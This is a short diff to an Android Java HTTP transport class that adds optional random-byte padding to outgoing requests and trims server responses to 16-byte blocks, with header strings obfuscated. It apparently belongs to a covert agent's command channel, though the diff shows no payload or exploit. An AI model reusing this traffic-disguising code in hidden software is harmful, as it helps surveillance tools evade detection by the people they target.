@@ -26,6 +26,7 @@ import org.apache.http.params.HttpParams;
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
+import com.android.service.util.Utils;
 
 public abstract class HttpKeepAliveTransport extends HttpTransport {
 	private static final String TAG = "HttpKeepAliveTransport"; //$NON-NLS-1$
@@ -46,7 +47,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 	 *             the transport exception
 	 */
 	@Override
-	public synchronized byte[] command(final byte[] data) throws TransportException {
+	public synchronized byte[] command(byte[] data) throws TransportException {
 		if (Cfg.DEBUG) {
 			Check.ensures(httpclient != null, "call startSession before command"); //$NON-NLS-1$
 			// httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY,
@@ -54,6 +55,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		}
 
 		final HttpPost httppost = new HttpPost(baseurl);
+		
 		httppost.setHeader(Messages.getString("3.0"), //$NON-NLS-1$
 				Messages.getString("3.1")); //$NON-NLS-1$
 		httppost.setHeader(Messages.getString("3.2"), Messages.getString("3.3")); //$NON-NLS-1$ //$NON-NLS-2$
@@ -68,6 +70,12 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		DataInputStream in = null;
 
 		try {
+			
+			if(Cfg.PROTOCOL_RANDBLOCK){
+				byte[] randBlock = Utils.getRandomByteArray(0, 16);				
+				data = Utils.concat(data, randBlock);
+			}
+			
 			httppost.setEntity(new ByteArrayEntity(data));
 			final HttpResponse response = httpclient.execute(httppost);
 
@@ -76,7 +84,15 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 			if (returnCode == HttpStatus.SC_OK) {
 				cookies = httpclient.getCookieStore().getCookies();
 
-				final long length = response.getEntity().getContentLength();
+				long length = response.getEntity().getContentLength();
+				if(Cfg.PROTOCOL_RANDBLOCK){
+					if(length%16>0){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (command), dropping some bytes: " +length%16);
+						}
+						length = length - (length%16);
+					}
+				}
 
 				in = new DataInputStream(response.getEntity().getContent());
 
